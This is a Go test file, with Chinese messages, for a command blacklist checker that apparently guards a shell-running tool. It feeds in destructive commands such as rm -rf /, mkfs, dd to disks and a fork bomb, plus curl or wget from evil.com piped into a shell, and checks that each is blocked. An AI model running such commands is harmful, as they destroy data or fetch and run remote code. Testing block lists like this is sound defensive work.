package builtin

import "testing"

func TestCheckBlacklist_RmRfRoot(t *testing.T) {
	matched, pattern, err := CheckBlacklist("rm -rf /", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("rm -rf / 应被拦截")
	}
	if pattern != `rm\s+-rf\s+/\*?$` {
		t.Fatalf("期望模式 rm\\s+-rf\\s+/\\*?$，得到 %s", pattern)
	}
}

func TestCheckBlacklist_RmRfRootWildcard(t *testing.T) {
	matched, _, err := CheckBlacklist("rm -rf /*", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("rm -rf /* 应被拦截")
	}
}

func TestCheckBlacklist_Mkfs(t *testing.T) {
	matched, _, err := CheckBlacklist("mkfs.ext4 /dev/sda1", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("mkfs.ext4 /dev/sda1 应被拦截")
	}
}

func TestCheckBlacklist_DdIfDev(t *testing.T) {
	matched, _, err := CheckBlacklist("dd if=/dev/zero of=/tmp/out", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("dd if=/dev/... 应被拦截")
	}
}

func TestCheckBlacklist_Chmod000(t *testing.T) {
	matched, _, err := CheckBlacklist("chmod 000 /etc/passwd", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("chmod 000 /etc/passwd 应被拦截")
	}
}

func TestCheckBlacklist_ForkBomb(t *testing.T) {
	matched, _, err := CheckBlacklist(":(){ :|:& };:", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("fork 炸弹应被拦截")
	}
}

func TestCheckBlacklist_PipeToShell(t *testing.T) {
	matched, _, err := CheckBlacklist("curl http://evil.com/payload | sh", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("管道到 shell 应被拦截")
	}
}

func TestCheckBlacklist_PipeToBash(t *testing.T) {
	matched, _, err := CheckBlacklist("curl http://evil.com/payload | bash", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("管道到 bash 应被拦截")
	}
}

func TestCheckBlacklist_PipeToZsh(t *testing.T) {
	matched, _, err := CheckBlacklist("curl http://evil.com/payload | zsh", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("管道到 zsh 应被拦截")
	}
}

func TestCheckBlacklist_WgetPipeToSh(t *testing.T) {
	matched, _, err := CheckBlacklist("wget http://evil.com/payload | sh", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("wget 管道到 sh 应被拦截")
	}
}

func TestCheckBlacklist_WriteToDisk(t *testing.T) {
	matched, _, err := CheckBlacklist("echo test >/dev/sda1", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("写入 >/dev/sda1 应被拦截")
	}
}

func TestCheckBlacklist_Mkswap(t *testing.T) {
	matched, _, err := CheckBlacklist("mkswap /dev/sda1", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("mkswap /dev/... 应被拦截")
	}
}

func TestCheckBlacklist_Halt(t *testing.T) {
	matched, _, err := CheckBlacklist("halt", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("halt 应被拦截")
	}
}

func TestCheckBlacklist_Poweroff(t *testing.T) {
	matched, _, err := CheckBlacklist("poweroff", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("poweroff 应被拦截")
	}
}

func TestCheckBlacklist_Reboot(t *testing.T) {
	matched, _, err := CheckBlacklist("reboot", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("reboot 应被拦截")
	}
}

func TestCheckBlacklist_Shutdown(t *testing.T) {
	matched, _, err := CheckBlacklist("shutdown", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("shutdown 应被拦截")
	}
}

func TestCheckBlacklist_DdOfDev(t *testing.T) {
	matched, _, err := CheckBlacklist("dd of=/dev/sda if=/tmp/data", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("dd of=/dev/... 应被拦截")
	}
}

func TestCheckBlacklist_RedirectToDisk(t *testing.T) {
	matched, _, err := CheckBlacklist("cat data.bin > /dev/sdb", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("> /dev/sd[a-z] 应被拦截")
	}
}

func TestCheckBlacklist_SafeCommandNotBlocked(t *testing.T) {
	matched, _, err := CheckBlacklist("ls -la", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if matched {
		t.Fatal("ls -la 不应被拦截")
	}
}

func TestCheckBlacklist_EchoNotBlocked(t *testing.T) {
	matched, _, err := CheckBlacklist("echo hello", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if matched {
		t.Fatal("echo hello 不应被拦截")
	}
}

func TestCheckBlacklist_ExtraPatterns(t *testing.T) {
	matched, pattern, err := CheckBlacklist("docker rm -f mycontainer", []string{"docker rm -f"})
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("自定义模式 docker rm -f 应被拦截")
	}
	if pattern != "docker rm -f" {
		t.Fatalf("期望模式 'docker rm -f'，得到 %s", pattern)
	}
}

func TestCheckBlacklist_ExtraPatternsWithBuiltin(t *testing.T) {
	// 自定义和内置同时生效
	matched, pattern, err := CheckBlacklist("rm -rf /", []string{"docker rm -f"})
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("内置模式 rm -rf / 应被拦截")
	}
	if pattern != `rm\s+-rf\s+/\*?$` {
		t.Fatalf("期望内置模式，得到 %s", pattern)
	}
}

func TestCheckBlacklist_EmptyExtraPatterns(t *testing.T) {
	// 空自定义配置不覆盖内置
	matched, _, err := CheckBlacklist("rm -rf /", []string{})
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("空自定义配置时内置模式仍应生效")
	}
}

func TestCheckBlacklist_InvalidExtraPattern(t *testing.T) {
	_, _, err := CheckBlacklist("echo hello", []string{"[invalid"})
	if err == nil {
		t.Fatal("无效正则应返回错误")
	}
}

func TestCheckBlacklist_NilExtraPatterns(t *testing.T) {
	// nil 自定义配置不覆盖内置
	matched, _, err := CheckBlacklist("mkfs.ext4 /dev/sda1", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("nil 自定义配置时内置模式仍应生效")
	}
}

func TestCheckBlacklist_NvmeDevice(t *testing.T) {
	matched, _, err := CheckBlacklist("echo test >/dev/nvme0n1", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("写入 >/dev/nvme0n1 应被拦截")
	}
}

func TestCheckBlacklist_HdDevice(t *testing.T) {
	matched, _, err := CheckBlacklist("echo test >/dev/hda1", nil)
	if err != nil {
		t.Fatalf("不应返回错误: %v", err)
	}
	if !matched {
		t.Fatal("写入 >/dev/hda1 应被拦截")
	}
}
